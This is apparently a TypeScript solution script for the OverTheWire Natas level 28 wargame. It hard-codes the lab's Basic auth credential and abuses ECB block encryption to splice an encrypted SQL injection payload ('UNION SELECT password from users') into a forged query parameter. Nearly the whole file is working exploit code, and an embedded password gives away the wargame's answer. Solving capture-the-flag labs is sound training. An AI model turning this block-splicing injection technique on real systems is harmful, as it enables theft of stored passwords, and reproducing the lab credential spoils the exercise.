async function crypt(str: string) {
	const controller = new AbortController();
	const id = setTimeout(() => controller.abort(), 5000);
	const res = await fetch(
		"http://natas28.natas.labs.overthewire.org/index.php",
		{
			headers: {
				authorization:
					"Basic bmF0YXMyODpza3J3eGNpQWU2RG5iMFZmRkR6REVIY0N6UW12M0dkNA==",
				"content-type": "application/x-www-form-urlencoded",
			},
			body: "query=" + encodeURIComponent(str),
			method: "POST",
			redirect: "manual",
			signal: controller.signal,
		}
	);
	clearTimeout(id);
	const loc = res.headers.get("Location");
	const p = new URLSearchParams(loc);
	const val = p.values().next().value;
	const buf = Buffer.from(val, "base64");
	const arr = [...buf];
	return arr;
}

const hex = (arr: Array<number>) =>
	arr.map((e) => e.toString(16).padStart(2, "0")).join("");

// okay, so we can assume that ' is escaped into \'
// so that means we can get a payload that starts with '
// if theres a block border in the middle of \'
//let payload = `' OR 1=1; -- `;
let payload = `' UNION SELECT password from users; -- `;

const normRes = await crypt("==========");
const response = await crypt("==========" + "X".repeat(15) + payload);
//const block = response.slice(48 + 16, 48 + 16 + 16);
const block = response.slice(48 + 16, 48 + 16 + 48);
const normBeginning = normRes.slice(0, 48);
const normEnd = normRes.slice(48);
console.log("Our payload block is " + hex(block));
console.log(
	"Our payload is " +
		encodeURIComponent(
			Buffer.from(normBeginning.concat(block).concat(normEnd)).toString(
				"base64"
			)
		)
);
